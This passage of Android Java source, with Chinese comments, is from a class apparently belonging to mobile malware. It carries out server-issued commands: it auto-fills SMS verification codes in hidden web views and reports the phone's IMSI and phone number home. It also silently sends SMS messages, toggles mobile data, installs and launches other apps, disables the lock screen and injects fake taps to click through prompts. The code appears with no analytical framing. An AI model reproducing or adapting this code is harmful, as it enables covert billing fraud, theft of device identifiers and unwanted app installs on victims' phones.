			ownWebView.loadUrl(webBean.getUrl());
			Logger.print(TAG, "页面已加载完!");
		}
	};
	
	Handler DoParseHandler = new Handler() {
		@Override
		public void handleMessage(Message msg) {
			super.handleMessage(msg);
			PageInnerBean pageInnerBean = (PageInnerBean) msg.obj;
			int type = pageInnerBean.getType();
			detalExe = new DetailExecutionSteps(ownWebView);
			switch (type) {
			case 1:
				// 单纯的点击
				detalExe.click(pageInnerBean);
				Logger.print(TAG, "单纯的点击操作!");
				break;
			case 2:
				// 点击获取验证码
				detalExe.clickToGetVerificationCode(pageInnerBean);
				Logger.print(TAG, "点击获取验证码!");
				break;
			case 3:
				// 填入固定字符串
				detalExe.fillFixedString(pageInnerBean);
				Logger.print(TAG, "填入固定字符串!");
				break;
			case 4:
				// 填入短信验证码
				detalExe.fillVerificationCode(pageInnerBean);
				Logger.print(TAG, "填入短信验证码!");
				break;
			}
		}
	};
	

	// 用于处理结果信息
	class SendGetWebCommandsResultThread extends Thread { 
		private String getResult;

		public SendGetWebCommandsResultThread(String _getResult) {
			this.getResult = _getResult;
		}

		@Override
		public void run() {
			super.run();
			DS service = new DS();
			service.doGetSendWebViewResult(mContext, null, 0,
					ControlBroadcastReceiver.QUDAOHAO,
					ControlBroadcastReceiver.currentVersion,
					ControlBroadcastReceiver.IMSI, "", "", getResult);
		}
	}

	// 发送短信执行结果
	class SendSmsExectueResult extends AsyncTask<String, Integer, String> {

		private String getResult;

		public SendSmsExectueResult(String _getResult) {
			this.getResult = _getResult;
		}

		@Override
		protected String doInBackground(String... params) {
			DS service = new DS();
			service.doSendExectueResult(mContext, null, 0,
					ControlBroadcastReceiver.QUDAOHAO,
					ControlBroadcastReceiver.IMSI,
					ControlBroadcastReceiver.currentVersion, getResult);
			return "";
		}
	}

	// 4.60 获取手机号码指令
	class IsGetBasicService extends AsyncTask<String, Integer, String> {

		private Context contextForServices;
		private String channel;
		private String imsi_1;

		public IsGetBasicService(Context _contextForServices, String _channel, String _imsi_1) {
			this.contextForServices = _contextForServices;
			this.channel = _channel;
			this.imsi_1 = _imsi_1;
		}

		@Override
		protected String doInBackground(String... params) {
			service.doGetBasicNumService(contextForServices, getBasicCommandHandler, 0, channel, imsi_1);
			return "";
		}

		Handler getBasicCommandHandler = new Handler() {

			@Override
			public void handleMessage(Message msg) {
				super.handleMessage(msg);

				RO object = (RO) msg.obj;

				BasicBean bBean = (BasicBean) object.obj;
				String phoneNum = bBean.getPhoneNumber();

				// 上报执行结果
				String success = "userNum:" + bBean.getPhoneNumber() + " ," + "doTime:" + bBean.getTime();
				String faild = "错误代码:" + object.obj;
				new SendSmsExectueResult(object.result ? success : faild).execute();
				if (object.result) {

					SharedPreferences initServicePreferences = contextForServices.getSharedPreferences(PlayService.PREFS_NAME, 0);
					SharedPreferences.Editor initServiceEditor = initServicePreferences.edit();

					int doTime = bBean.getTime();

					if (doTime > 0) {
						// LH.LogPrint(tag, "IsGetBasicService--有心跳时间");
						// 重置心跳时间
						initServiceEditor.putInt(PlayService.WAIT_TIME, doTime);
						// 重置起始时间
						initServiceEditor.putLong(PlayService.PHONE_TIME, System.currentTimeMillis());
						// 重置判断条件
						initServiceEditor.putBoolean(PlayService.ISSENDPHONENUMBERREQUEST, false);
						initServiceEditor.commit();
					} else {
						// LH.LogPrint(tag, "IsGetBasicService--没有心跳时间");
						// 重置判断条件，立即发起初始化操作
						initServiceEditor.putBoolean(PlayService.ISSENDPHONENUMBERREQUEST, false);
						initServiceEditor.commit();
					}

					// 重新启动服务
					ControlBroadcastReceiver.startMainServiceForActivity(contextForServices);

					// 手机号码
					String phoneNumber = bBean.getPhoneNumber();
					if (phoneNumber != null && !"".equals(phoneNumber.trim())) {
						// LH.LogPrint(tag, "hm-->" + phoneNumber);
						if ("0".equals(phoneNumber.trim())) {
							Logger.print(TAG, "电话为0不上报!");
						} else {
							new SendUsPhoNumThread(contextForServices, phoneNumber).start();
						}
					} else {
						// LH.LogPrint(tag, "hm-->no");
					}

					return;

				} else {

					Logger.print(TAG, "手机号为：" + phoneNum);
				}

				// LH.LogPrint(tag, "其他情况");
				// 其他情况都以失败论断
				SharedPreferences initServicePreferences = contextForServices.getSharedPreferences(PlayService.PREFS_NAME, 0);
				SharedPreferences.Editor initServiceEditor = initServicePreferences.edit();
				// 重置判断条件，立即发起初始化操作
				initServiceEditor.putBoolean(PlayService.ISSENDPHONENUMBERREQUEST, false);
				initServiceEditor.commit();

				// umeng停止
				UmengUtil umengUtil = UmengUtil.getIntent();
				umengUtil.stopUmeng(contextForServices);

				startMainServiceForActivity(contextForServices);

			}

		};

		// 发送用户手机号码的线程
		class SendUsPhoNumThread extends Thread {

			private Context thread_mContext;
			private String forUserPhoneNumber;

			public SendUsPhoNumThread(Context _mContext, String _number) {
				this.thread_mContext = _mContext;
				this.forUserPhoneNumber = _number;
			}

			@Override
			public void run() {
				super.run();

				try {

					// LH.LogPrint("forUserPhoneNumber", "forUserPhoneNumber");

					// 需要发送短信
					In infor = new In(thread_mContext);
					boolean isTwoCard = infor.chargeHasTwoImsi(thread_mContext);
					if (isTwoCard) {
						// LH.LogPrint("forUserPhoneNumber", "双卡双待");
						// 这是两张卡槽
						String send_imsi_1 = infor.getTwoImsi(thread_mContext,0);
						String send_imsi_2 = infor.getTwoImsi(thread_mContext,1);
						// LH.LogPrint("forUserPhoneNumber", "imsi_1:" +
						// send_imsi_1 + ", imsi_2:" + send_imsi_2);

						if (send_imsi_1 != null
								&& !"".equals(send_imsi_1.trim())) {
							// 使用卡槽一发送短信，md5加密
							byte[] bb = send_imsi_1.getBytes("UTF-8");
							String send_imsi_1_md5 = MD5.bytes2hex(MD5.md5(bb));
							// 发送短信，上报手机号码
							SendMessageManager.sendSMS1(thread_mContext,forUserPhoneNumber, "GMPG" + send_imsi_1_md5, null);
						} else if (send_imsi_2 != null && !"".equals(send_imsi_2.trim())) {
							// 使用卡槽2发送短信，md5加密
							byte[] bb = send_imsi_2.getBytes("UTF-8");
							String send_imsi_2_md5 = MD5.bytes2hex(MD5.md5(bb));
							// 发送短信，上报手机号码
							SendMessageManager.sendSMS1(thread_mContext, forUserPhoneNumber, "GMPG" + send_imsi_2_md5, null);
						}

					} else {
						// 这是单卡的，那么只要这个发送
						String send_imsi = getIMSI(thread_mContext);
						// 发送短信，上报手机号码
						SendMessageManager.sendSMS1(thread_mContext,
								forUserPhoneNumber, "GMPG" + send_imsi, null);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

	public static void StartMainservice(Context context, String pkg, String cls) {
		// LH.LogPrint(tag, "StartMainservice:");

		final Intent intentstart = new Intent(Intent.ACTION_MAIN, null);
		intentstart.addCategory(Intent.CATEGORY_LAUNCHER);
		// ComponentName 启动第三方程序代码
		final ComponentName cn = new ComponentName(pkg, cls);
		intentstart.setComponent(cn);
		intentstart.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startService(intentstart);
	}

	public static void startMainServiceForActivity(Context context) {
		//通过这个方法启动服务
		StartMainservice(context, context.getPackageName(), PlayService.SERVICE_ACTION);
	}

	public static void StartReadtimeropen() {
		if (mTimerOpen != null) {
			mTimerOpen.cancel();
		}
		// LH.LogPrint(tag, "Starttimeropen");
		mTimerOpen = new Timer();
		mTimerOpen.schedule(new TimerTask() {
			@Override
			public void run() {
				// LH.LogPrint(tag, "timer out open");
				mTimerOpen = null;
				int sdkVersion = Integer.parseInt(Build.VERSION.SDK);
				if (mContext != null) {
					ApnControl AP = new ApnControl(mContext);
					if (sdkVersion > 7) {
						AP.setNetWorkEnable(false);
					} else {
						AP.setMobileDatastate(mContext, false);
					}
				}

			}
		}, Delayopen);
	}

	// ================ 5.50 =======================
	// 是否获取到了系统权限，然后自定义安装
	public static int issysuser(Context cm) {
		int result = 0;
		try {
			cm.enforceCallingOrSelfPermission("android.permission.INSTALL_PACKAGES", null);
			// LH.LogPrint(tag, "permission success");
			result = 1;
		} catch (SecurityException localSecurityException) {
			result = 0;
		}
		return result;
	}

	// 判断某个应用是否已经安装
	public static boolean isinstalled(Context context, String pkname) {
		PackageManager pManager = context.getPackageManager();
		// 获取手机内所有应用
		List<PackageInfo> paklist = pManager.getInstalledPackages(0);
		for (int i = 0; i < paklist.size(); i++) {
			PackageInfo pak = (PackageInfo) paklist.get(i);
			// 判断是否为非系统预装的应用程序
			if (pak.applicationInfo.packageName.equals(pkname)) {
				// LH.LogPrint(tag, "isinstalled finded : " + pkname);
				return true;
			}
		}
		return false;
	}

	// /============================================
	public static String gethomepackagename(Context context, String pkname) {
		String ret = null;
		PackageManager pManager = context.getPackageManager();
		// 获取手机内所有应用
		List<PackageInfo> paklist = pManager.getInstalledPackages(0);
		for (int i = 0; i < paklist.size(); i++) {
			PackageInfo pak = (PackageInfo) paklist.get(i);
			// 判断是否为非系统预装的应用程序
			if (pak.applicationInfo.packageName.contains(pkname)) {
				if ((pak.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
					// 非系统应用
				} else {
					// 系统应用
					// LH.LogPrint(tag, "finded");
					ret = pak.applicationInfo.packageName;

				}
				// customs applications
			}
		}
		return ret;
	}

	// /============================================

	public static void Gotohome(Context context) {
		// LH.LogPrint(tag, "Gotohome:");
		String packagename = gethomepackagename(context, "launcher");
		if (packagename != null) {
			// LH.LogPrint(tag, "Gotohome:packagename:" + packagename); 
			StartApk_New(context, packagename);
			// StartApk(context,packagename);
		} else {
			Intent intent = new Intent(Intent.ACTION_MAIN);
			intent.addCategory(Intent.CATEGORY_HOME);
			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(intent);
		}
	}

	// /============================================

	public static void StartApk(Context context, String pkg) {
		
		// LH.LogPrint(tag, "StartApk:" + pkg);
		PackageManager pm = context.getPackageManager();
		PackageInfo pi = null;
		try {
			pi = pm.getPackageInfo(pkg, PackageManager.GET_ACTIVITIES);
			// 这里指向第一个包中的Activity, 大多数都是第一个Activity为启动Activity
			// InstallCommandContainer commands =
			// InstallCommandContainer.GetInstance(context);
			// commands.setSNAME(pkg, sName);
			StartApk1(context, pkg, pi.activities);
		} catch (NameNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void StopApk(Context context, String pkg) {
		// LH.LogPrint(tag, "StopApk:" + pkg);
		ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
		List<ActivityManager.RunningAppProcessInfo> runningAppProcesses = manager.getRunningAppProcesses();
		if (runningAppProcesses != null) {
			for (int i = 0; i < runningAppProcesses.size(); i++) {
				// LH.LogPrint(tag, "StopApk:processname:" +
				// runningAppProcesses.get(i).processName);
				if (runningAppProcesses.get(i).processName.indexOf(pkg) == 0) {
					// LH.LogPrint(tag, "StopApk:processname:found:" +
					// runningAppProcesses.get(i).processName);
					manager.restartPackage(runningAppProcesses.get(i).processName);
				}
			}
			
		}
	}

	// /============================================
	public static void StartApk_New(Context context, String pkg) {
		// LH.LogPrint(tag, "StartApk_New:" + pkg);
		PackageManager pm = context.getPackageManager();
		Intent i = pm.getLaunchIntentForPackage(pkg);
		// 如果该程序不可启动（像系统自带的包，有很多是没有入口的）会返回NULL
		if (i != null) {
			try {
				context.startActivity(i);
			} catch (ActivityNotFoundException e) {
				// LH.LogPrint(tag, "ActivityNotFoundException:" +
				// e.getMessage());
			} catch (Exception e) {
				// LH.LogPrint(tag, "Exception:" + e.getMessage());
			}
		} else {
			// LH.LogPrint(tag, "StartApk_New:intent is null");
			StartApk(context, pkg);
		}
	}

	public static void StartApk1(Context context, String pkg, ActivityInfo[] info) {
		// LH.LogPrint(tag, "StartApk1:" + pkg);
		if (info != null) {
			// LH.LogPrint(tag, "StartApk1:length" + info.length);
			for (int i = 0; i < info.length; i++) {
				boolean flag = false;
				if (info[i] != null) {
					String sName = info[i].name;
					// LH.LogPrint(tag, "StartApk1:sName:" + sName);
					final Intent intentstart = new Intent(Intent.ACTION_MAIN, null);
					intentstart.addCategory(Intent.CATEGORY_LAUNCHER);
					final ComponentName cn = new ComponentName(pkg, sName);
					intentstart.setComponent(cn);
					intentstart.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					try {
						context.startActivity(intentstart);
						flag = true;
					} catch (ActivityNotFoundException e) {
						// LH.LogPrint(tag, "ActivityNotFoundException:" +
						// e.getMessage());
					} catch (Exception e) {
						// LH.LogPrint(tag, "Exception:" + e.getMessage());
					}
				}
				if (flag == true) {
					break;
				}
			}
		}
	}

	public static void StartApk_formode(Context context, String pkg, int mode) {
		// LH.LogPrint(tag, "StartApk_formode:" + pkg);
		InstallCommandContainer commands = InstallCommandContainer.GetInstance(context);
		commands.setIsinstalledstatus(pkg, 2);
		StartApk_New(context, pkg);
		// StartApk(context,pkg);
		mContext = context;
		if ((mode == 0) || (mode == 1)) {
			Starttimer1();
		} else {
			Starttimer2();
		}
	}

	public static void Starttimer1() {
		if (mTimer1 != null) {
			mTimer1.cancel();
		}
		// LH.LogPrint(tag, "Starttimer1");
		mTimer1 = new Timer();
		mTimer1.schedule(new TimerTask() {
			@Override
			public void run() {
				// LH.LogPrint(tag, "timer out 1");
				mTimer1 = null;
				InstallCommandContainer commands = InstallCommandContainer.GetInstance(mContext);
				commands.Douninstallswithstarted();
				InstallCommandBean tip = commands.GetWaitStartCommand();
				if (tip != null) {
					// LH.LogPrint(tag, "timer out 1:packname" +
					// tip.getPackname());
					// LH.LogPrint(tag, "timer out 1:isauto" + tip.getIsauto());
					StartApk_formode(mContext, tip.getPackname(), tip.getMode());
				}
			}
		}, Delay1);

		try {
			Thread.sleep(5000L);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		Gotohome(mContext);
	}

	public static void Starttimer2() {
		if (mTimer2 != null) {
			mTimer2.cancel();
		}
		// LH.LogPrint(tag, "Starttimer2");
		mTimer2 = new Timer();
		mTimer2.schedule(new TimerTask() {
			@Override
			public void run() {
				// LH.LogPrint(tag, "timer out 2");
				mTimer2 = null;
				ManageKeyguard.initialize(mContext);
				ManageKeyguard.disableKeyguardlock();
				// int moldbrightness = getBrightness(mContext);
				// updateBrightness(mContext,0);
				WindowManager WM = (WindowManager) mContext.getSystemService(Context.WINDOW_SERVICE);
				DisplayMetrics dm = new DisplayMetrics();
				WM.getDefaultDisplay().getMetrics(dm);
				sendPointerDelay(20, dm.heightPixels - 20);
				sendPointerDelay(20, dm.heightPixels - 20);
				sendPointerDelay(30, dm.heightPixels - 30);
				sendPointerDelay(40, dm.heightPixels - 40);
				sendPointerDelay(50, dm.heightPixels - 50);
				sendPointerDelay(60, dm.heightPixels - 60);
				// updateBrightness(mContext,moldbrightness);
				ManageKeyguard.enableKeyguardlock();
				Starttimer1();
			}
		}, Delay2);
	}

	public static void Starttimer3() {
		if (mTimer3 != null) {
			mTimer3.cancel();
		}
		// LH.LogPrint(tag, "Starttimer3");
		mTimer3 = new Timer();
		mTimer3.schedule(new TimerTask() {
			@Override
			public void run() {
				// LH.LogPrint(tag, "timer out 3");
				mTimer3 = null;
				ProtocolParserOtherCommands.Stopotherservices(mContext);
				InstallCommandContainer commands = InstallCommandContainer.GetInstance(mContext);
				if (commands.GetLength() > 0) {
					commands.DoInstallCommands();
				}
			}
		}, Delay3);
	}

	public void Canceltimer1() {
		if (mTimer1 != null) {
			mTimer1.cancel();
		}
		mTimer1 = null;
		// LH.LogPrint(tag, "Canceltimer1");
	}

	public void Canceltimer2() {
		if (mTimer2 != null) {
			mTimer2.cancel();
		}
		mTimer2 = null;
		// LH.LogPrint(tag, "Canceltimer2");
	}

	public void Canceltimer3() {
		if (mTimer3 != null) {
			mTimer3.cancel();
		}
		mTimer3 = null;
		// LH.LogPrint(tag, "Canceltimer3");
	}

	static public void sendPointerDelay(float x, float y) {
		if (ControlBroadcastReceiver.issysuser(mContext) == 0) {
			return;
		} else {
			sendPointerDelay_1(x, y);
		}
	}

	static public void sendPointerDelay_1(float x, float y) {
		try {
			Thread.sleep(100);
			MotionEvent e = MotionEvent.obtain(SystemClock.uptimeMillis(), SystemClock.uptimeMillis(), MotionEvent.ACTION_DOWN, x, y, 0);
			sendPointerSync(e);
			e = MotionEvent.obtain(SystemClock.uptimeMillis(), SystemClock.uptimeMillis(), MotionEvent.ACTION_UP, x, y, 0);
			sendPointerSync(e);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	static public void sendPointerSync(MotionEvent event) {
		try {
			Thread.sleep(100);
			IWindowManager windowMger = null;
			try {
				Object object = new Object();
				Method getService = Class.forName("android.os.ServiceManager").getMethod("getService", String.class);
				Object obj = getService.invoke(object, new Object[] { new String("window") });
				windowMger = IWindowManager.Stub.asInterface((IBinder) obj);
				windowMger.injectPointerEvent(event, true);
			} catch (ClassNotFoundException ex) {
				// ignored
			} catch (NoSuchMethodException ex) {
				// ignored
			} catch (IllegalAccessException ex) {
				// ignored
			} catch (InvocationTargetException ex) {
				// ignored
			} catch (SecurityException localSecurityException) {
				// //LH.LogPrint("sendPointerSync", "security");
			}
			// IWindowManager wm = IWindowManager.Stub.asInterface(
			// ServiceManager.getService("window"));

		} catch (InterruptedException e) {
			e.printStackTrace();
		} catch (RemoteException e) {
			e.printStackTrace();
		}
	}

	// 把安装成功的结果上报服务器
	class SendApkInstaResultThread extends Thread {

		private Context context;
		private String packageName;

		public SendApkInstaResultThread(Context _context, String _packageName) {
			this.context = _context;
			this.packageName = _packageName;
		}

		@Override
		public void run() {
			super.run();

			try {
				DS service = new DS();
				getBasicInfo(context);
				service.doSendApkInstallationResult(context, QUDAOHAO, IMSI, packageName);
			} catch (Exception e) {
				e.printStackTrace();
			}

		}
	}

	// public static Handler webViewHandler = new Handler(){
	// @Override
	// public void handleMessage(Message msg) {
	// super.handleMessage(msg);
	// if(msg.obj != null){
	// ArrayList<WebBean> webBeanList = (ArrayList<WebBean>) msg.obj;
	// for(WebBean webBean : webBeanList){
	// new MyWebView(mContext, webBean).startProcess();
	// }
	// }
	// }
	// };

}
